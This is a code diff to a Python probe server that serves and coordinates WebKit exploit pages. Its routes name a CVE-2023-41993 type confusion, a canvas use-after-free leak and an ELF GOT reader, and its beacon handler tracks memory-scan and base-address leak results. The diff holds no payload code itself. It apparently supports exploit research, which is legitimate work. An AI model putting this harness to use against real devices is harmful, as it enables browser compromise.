@@ -37,7 +37,6 @@ ROOT = pathlib.Path(__file__).resolve().parent
 PROJECT = ROOT.parent.parent
 
 STATIC = {
-    '/': ROOT / 'launcher.html',
     '/p809': PROJECT / 'probes' / 'phase13_webkit' / 'p809-elf-got-reader.html',
     '/p809v24b.html': PROJECT / 'probes' / 'phase13_webkit' / 'p809v24b.html',
     '/p809v24b': PROJECT / 'probes' / 'phase13_webkit' / 'p809v24b.html',
@@ -137,6 +136,8 @@ STATIC = {
     '/p622': PROJECT / 'probes' / 'phase13_webkit' / 'p622-cve-2023-41993-type-confusion.html',
     '/p619': PROJECT / 'probes' / 'phase13_webkit' / 'p619-webgl-rtc-api-survey.html',
     '/p620': PROJECT / 'probes' / 'phase13_webkit' / 'p620-section-f-crash-backtrace.html',
+    '/p818v13.html': PROJECT / 'probes' / 'phase13_webkit' / 'p818v13.html',
+    '/p818v13': PROJECT / 'probes' / 'phase13_webkit' / 'p818v13.html',
     '/launcher.html': ROOT / 'launcher.html',
     '/p550.html': ROOT / 'p550.html',
     '/p550.js': PROJECT / 'probes' / 'phase13_webkit' / 'p550-canvas-uaf-transform-leak.js',
@@ -178,6 +179,7 @@ P689_STATE = {'pendingArm': None, 'alive': False, 'armFrom': None,
 P690_STATE = {'pendingArm': None, 'alive': False, 'armFrom': None,
                 'mode': None}
 
+
 P807_STATE = {
     'phase': 'idle',      # idle | coarse | fine | header | base-coarse | base-fine | base-scan | done
     'scanAddr': None,     # current scan address (int)
@@ -196,6 +198,9 @@ P807_STATE = {
     'boundary': None,     # VP - .text/.rodata boundary (VP-relative delta, set after header phase)
     'alive': False,       # reset on ARM, set on ALIVE
 }
+
+P818_STATE = {'sl': 0}
+P820_STATE = {'sl': 0}
 
 
 _LOG_ESCAPES = str.maketrans({
@@ -753,6 +758,81 @@ class ProbeHandler(http.server.BaseHTTPRequestHandler):
             self.wfile.write(b'OK')
             return
 
+        if path == '/p818state':
+            body = json.dumps({'sl': P818_STATE['sl']}).encode()
+            self.send_response(200)
+            self.send_header('Content-Type', 'application/json')
+            self.send_header('Content-Length', str(len(body)))
+            self.send_header('Cache-Control', 'no-store')
+            self.end_headers()
+            self.wfile.write(body)
+            return
+
+        if path == '/p818reset':
+            P818_STATE['sl'] = 0
+            self.send_response(200)
+            self.send_header('Content-Type', 'text/plain')
+            self.send_header('Content-Length', 2)
+            self.send_header('Cache-Control', 'no-store')
+            self.end_headers()
+            self.wfile.write(b'OK')
+            return
+
+        if path == '/':
+            data = b'<!DOCTYPE html><html><head><meta charset="utf-8"><meta http-equiv="refresh" content="0;url=/walkI.html"><title>go</title></head><body style="background:#111;color:#0f0;font:bold 48px monospace;text-align:center;padding:40vh 0"><a href="/walkI.html" style="color:#0f0">LOAD PROBE</a></body></html>'
+            self.send_response(200)
+            self.send_header('Content-Type', 'text/html; charset=utf-8')
+            self.send_header('Content-Length', str(len(data)))
+            self.send_header('Cache-Control', 'no-store')
+            self.end_headers()
+            self.wfile.write(data)
+            return
+
+        if path in ('/p821.html', '/walk1.html', '/walk2.html', '/walk3.html', '/walk4.html', '/walk5.html', '/walk6.html', '/walk7.html', '/walk8.html', '/walk9.html', '/walkA.html', '/walkB.html', '/walkC.html', '/walkD.html', '/walkE.html', '/walkF.html', '/walkG.html', '/walkH.html', '/walkI.html'):
+            fname = path.lstrip('/')
+            walk_path = PROJECT / 'probes' / 'phase13_webkit' / fname
+            if walk_path.is_file():
+                data = walk_path.read_bytes()
+                with self._static_response_output():
+                    self.send_response(200)
+                    self.send_header('Content-Type', 'text/html; charset=utf-8')
+                    self.send_header('Content-Length', str(len(data)))
+                    self.send_header('Cache-Control', 'no-store')
+                    self.end_headers()
+                    self.wfile.write(data)
+                return
+
+        if path in ('/p820.html',):
+            slice_path = PROJECT / 'probes' / 'phase13_webkit' / 'p820.html'
+            if slice_path.is_file():
+                data = slice_path.read_text(encoding='utf-8')
+                data = data.replace('__SLICE__', str(P820_STATE['sl']))
+                data = data.encode('utf-8')
+                with self._static_response_output():
+                    self.send_response(200)
+                    self.send_header('Content-Type', 'text/html; charset=utf-8')
+                    self.send_header('Content-Length', str(len(data)))
+                    self.send_header('Cache-Control', 'no-store')
+                    self.end_headers()
+                    self.wfile.write(data)
+                return
+
+        if path in ('/', '/p818v15.html', '/p818v16.html', '/p818v17.html', '/p818v18.html', '/p818v20.html', '/p818v21.html', '/p818v22.html', '/p818v23.html', '/p818v24.html'):
+            fname = 'p818v24.html' if path == '/' else path.lstrip('/')
+            slice_path = PROJECT / 'probes' / 'phase13_webkit' / fname
+            if slice_path.is_file():
+                data = slice_path.read_text(encoding='utf-8')
+                data = data.replace('__SLICE__', str(P818_STATE['sl']))
+                data = data.encode('utf-8')
+                with self._static_response_output():
+                    self.send_response(200)
+                    self.send_header('Content-Type', 'text/html; charset=utf-8')
+                    self.send_header('Content-Length', str(len(data)))
+                    self.send_header('Cache-Control', 'no-store')
+                    self.end_headers()
+                    self.wfile.write(data)
+                return
+
         if path == '/beacon' or path.startswith('/beacon/'):
             if path == '/beacon':
                 qs = parse_qs(parsed.query)
@@ -810,6 +890,7 @@ class ProbeHandler(http.server.BaseHTTPRequestHandler):
                     self.end_headers()
                     self.wfile.write(data)
                 return
+
 
         probe_file = _safe_file(
             PROJECT / 'probes' / 'phase13_webkit', path.lstrip('/')
@@ -927,6 +1008,42 @@ class ProbeHandler(http.server.BaseHTTPRequestHandler):
                 m = re.search(r'RVA-(0x[0-9a-fA-F]+)', msg)
                 if m:
                     P807_STATE['rva'] = int(m.group(1), 16)
+            elif msg.startswith('P817-ARMDELTA-'):
+                m = re.search(r'ARMDELTA-(0x[0-9a-fA-F]+)', msg)
+                if m:
+                    P807_STATE['armDelta'] = int(m.group(1), 16)
+                    P807_STATE['armed'] = P807_STATE['armDelta']
+                    P807_STATE['alive'] = False
+                    if P807_STATE['phase'] == 'idle':
+                        P807_STATE['phase'] = 'scan'
+            elif msg.startswith('P817-SCAN-') and '-addr=' in msg:
+                P807_STATE['alive'] = True
+                if P807_STATE['armDelta'] is not None:
+                    P807_STATE['okDelta'] = P807_STATE['armDelta']
+            elif msg.startswith('P817-BASE-'):
+                m = re.search(r'BASE-(0x[0-9a-fA-F]+)', msg)
+                if m:
+                    P807_STATE['base'] = int(m.group(1), 16)
+                    P807_STATE['done'] = True
+                    P807_STATE['phase'] = 'done'
+            elif msg.startswith('P817-PHASE-'):
+                m = re.search(r'PHASE-([\w-]+)', msg)
+                if m:
+                    P807_STATE['phase'] = m.group(1)
+            elif msg.startswith('P817-P818-NOSELF'):
+                P818_STATE['sl'] += 1
+            elif msg.startswith('P817-P818-SELF'):
+                P818_STATE['sl'] = 0
+            elif msg.startswith('P817-'):
+                pass
+            elif msg.startswith('P818-NOSELF'):
+                P818_STATE['sl'] += 1
+            elif msg.startswith('P818-SELF'):
+                P818_STATE['sl'] = 0
+            elif msg.startswith('P820-NOSELF'):
+                P820_STATE['sl'] += 1
+            elif msg.startswith('P820-SELF'):
+                P820_STATE['sl'] = 0
         except Exception:
             pass
         ts = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')[:-3]
